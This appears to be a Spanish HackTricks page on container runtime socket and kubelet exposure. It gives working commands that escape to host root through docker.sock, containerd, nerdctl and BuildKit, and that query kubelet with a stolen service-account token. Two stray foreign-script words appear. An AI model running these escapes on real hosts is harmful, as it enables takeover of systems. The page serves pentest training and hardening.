# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Muchas compromisos reales de contenedores no comienzan con un namespace escape en absoluto. Comienzan con acceso al control plane del runtime. Si un workload puede hablar con `dockerd`, `containerd`, CRI-O, Podman o kubelet a través de un Unix socket montado o un listener TCP expuesto, el atacante puede ser capaz de solicitar un nuevo contenedor con mejores privilegios, montar el filesystem del host, unirse a los namespaces del host o recuperar información sensible del nodo. En esos casos, la runtime API es el verdadero perímetro de seguridad, y comprometerla es funcionalmente muy parecido a comprometer el host.

Por eso la exposición del socket del runtime debe documentarse por separado de las protecciones del kernel. Un contenedor con seccomp normal, capabilities y confinamiento MAC aún puede estar a una sola llamada de API de comprometer el host si `/var/run/docker.sock` o `/run/containerd/containerd.sock` está montado dentro de él. El aislamiento del kernel del contenedor actual puede estar funcionando exactamente como se diseñó mientras el management plane del runtime permanece completamente expuesto.

## Daemon Access Models

Docker Engine tradicionalmente expone su API privilegiada a través del Unix socket local en `unix:///var/run/docker.sock`. Históricamente también se ha expuesto de forma remota mediante listeners TCP como `tcp://0.0.0.0:2375` o un listener protegido por TLS en `2376`. Exponer el daemon de forma remota sin TLS fuerte y autenticación de cliente convierte efectivamente la Docker API en una interfaz de root remoto.

containerd, CRI-O, Podman y kubelet exponen superficies similares de alto impacto. Los nombres y workflows difieren, pero la lógica no. Si la interfaz permite al caller crear workloads, montar rutas del host, recuperar credenciales o alterar contenedores en ejecución, la interfaz es un canal de administración privilegiado y debe tratarse en consecuencia.

Las rutas locales comunes que merece la pena revisar son:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Los stacks más antiguos o más especializados también pueden exponer endpoints como `dockershim.sock`, `frakti.sock` o `rktlet.sock`. Son menos comunes en entornos modernos, pero cuando se encuentran deben tratarse con la misma cautela porque representan superficies de control del runtime en lugar de sockets de aplicaciones normales.

## Secure Remote Access

Si un daemon debe exponerse más allá del socket local, la conexión debe protegerse con TLS y, preferiblemente, con autenticación mutua para que el daemon verifique al cliente y el cliente verifique al daemon. El viejo hábito de abrir el Docker daemon en HTTP plano por conveniencia es uno de los errores más peligrosos en la administración de containers porque la superficie de la API es lo bastante potente como para crear contenedores privilegiados directamente.

El patrón histórico de configuración de Docker era el siguiente:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
En hosts basados en systemd, la comunicación con el daemon también puede aparecer como `fd://`, lo que significa que el proceso hereda un socket preabierto de systemd en lugar de enlazarlo directamente por sí mismo. La lección importante no es la sintaxis exacta, sino la consecuencia de seguridad. En el momento en que el daemon escucha más allá de un socket local con permisos estrictos, la seguridad del transporte y la autenticación del cliente se vuelven obligatorias en lugar de hardening opcional.

## Abuse

Si hay un runtime socket presente, confirma cuál es, si existe un cliente compatible y si es posible el acceso HTTP o gRPC en bruto:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Estos comandos son útiles porque distinguen entre una ruta muerta, un socket montado pero inaccesible, y una API privilegiada activa. Si el cliente tiene éxito, la siguiente pregunta es si la API puede lanzar un nuevo container con un host bind mount o host namespace sharing.

### When No Client Is Installed

La ausencia de `docker`, `podman`, o de otro CLI amigable no significa que el socket sea seguro. Docker Engine habla HTTP a través de su Unix socket, y Podman expone tanto una API compatible con Docker como una API nativa de Libpod mediante `podman system service`. Eso significa que un entorno mínimo con solo `curl` aún puede ser suficiente para controlar el daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Esto importa durante post-exploitation porque a veces los defensores eliminan los binarios de cliente habituales pero dejan montado el management socket. En hosts Podman, recuerda que la ruta de alto valor difiere entre despliegues rootful y rootless: `unix:///run/podman/podman.sock` para instancias de servicio rootful y `unix://$XDG_RUNTIME_DIR/podman/podman.sock` para las rootless.

### Full Example: Docker Socket To Host Root

Si `docker.sock` es accesible, el escape clásico es iniciar un nuevo contenedor que monte el sistema de archivos root del host y luego hacer `chroot` dentro de él:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Esto proporciona ejecución directa como root del host a través del daemon de Docker. El impacto no se limita a lecturas de archivos. Una vez dentro del nuevo container, el atacante puede modificar archivos del host, recopilar credentials, implantar persistence, o iniciar cargas de trabajo privilegiadas adicionales.

### Full Example: Docker Socket To Host Namespaces

Si el atacante prefiere entrar en namespaces en lugar de acceso solo al filesystem:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Esta ruta alcanza el host pidiendo al runtime que cree un nuevo container con exposición explícita del host-namespace en lugar de explotando el actual.

### Full Example: containerd Socket

Un socket de `containerd` montado suele ser igualmente peligroso:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Si hay un cliente más parecido a Docker, `nerdctl` puede ser más conveniente que `ctr` porque expone flags familiares como `--privileged`, `--pid=host` y `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
El impacto vuelve a ser la compromisión del host. Incluso si falta tooling específico de Docker, otra runtime API aún puede ofrecer el mismo poder administrativo. En nodos de Kubernetes, `crictl` también puede ser suficiente para reconocimiento e interacción con contenedores porque habla directamente con el endpoint CRI.

### BuildKit Socket

`buildkitd` es fácil de pasar por alto porque la gente suele pensar en él como "solo el backend de build", pero el daemon sigue siendo un plano de control privilegiado. Un `buildkitd.sock` accesible puede permitir a un atacante ejecutar pasos de build arbitrarios, inspeccionar las capacidades del worker, usar contexts locales del entorno comprometido y solicitar entitlements peligrosos como `network.host` o `security.insecure` cuando el daemon fue configurado para թույլsarlos.

Las primeras interacciones útiles son:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Si el daemon acepta solicitudes de build, prueba si hay entitlements inseguros disponibles:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
El impacto exacto depende de la configuración del daemon, pero un servicio BuildKit rootful con entitlements permisivos no es una comodidad inofensiva para desarrolladores. Trátalo como otra superficie administrativa de alto valor, especialmente en CI runners y nodos de build compartidos.

### Kubelet API Over TCP

El kubelet no es un container runtime, pero sigue siendo parte del plano de gestión del nodo y a menudo entra en la misma discusión de trust boundary. Si el puerto seguro del kubelet `10250` es accesible desde la workload, o si las credenciales del nodo, kubeconfigs o proxy rights están expuestos, el atacante puede ser capaz de enumerar Pods, recuperar logs o ejecutar comandos en contenedores locales del nodo sin siquiera tocar la ruta de admisión del Kubernetes API server.

Empieza con discovery barato:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Si la ruta proxy del kubelet o del API-server autoriza `exec`, un cliente compatible con WebSocket puede convertir eso en ejecución de código en otros contenedores del nodo. Esta es también la razón por la que `nodes/proxy` con solo permiso `get` es más peligroso de lo que parece: la solicitud todavía puede llegar a endpoints del kubelet que ejecutan comandos, y esas interacciones directas con kubelet no aparecen en los registros normales de auditoría de Kubernetes.

## Checks

El objetivo de estas comprobaciones es responder si el contenedor puede الوصول any management plane that should have remained outside the trust boundary.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Qué es interesante aquí:

- Un socket de runtime montado suele ser un primitivo administrativo directo en lugar de una mera divulgación de información.
- Un listener TCP en `2375` sin TLS debe tratarse como una condición de compromiso remoto.
- Variables de entorno como `DOCKER_HOST` a menudo revelan que la carga de trabajo fue diseñada intencionalmente para hablar con el runtime del host.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | `dockerd` escucha en el socket local y el daemon suele ser rootful | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
| Podman | Daemonless CLI by default | No se requiere un daemon privilegiado de larga duración para el uso local ordinario; las API sockets aún pueden quedar expuestas cuando `podman system service` está habilitado | exposing `podman.sock`, running the service broadly, rootful API use |
| containerd | Local privileged socket | La API administrativa se expone a través del socket local y normalmente la consumen herramientas de nivel superior | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
| CRI-O | Local privileged socket | El endpoint CRI está pensado para componentes de confianza locales al nodo | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
| Kubernetes kubelet | Node-local management API | Kubelet no debería ser ampliamente accesible desde Pods; el acceso puede exponer estado de pod, credenciales y capacidades de ejecución según authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |

## References

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
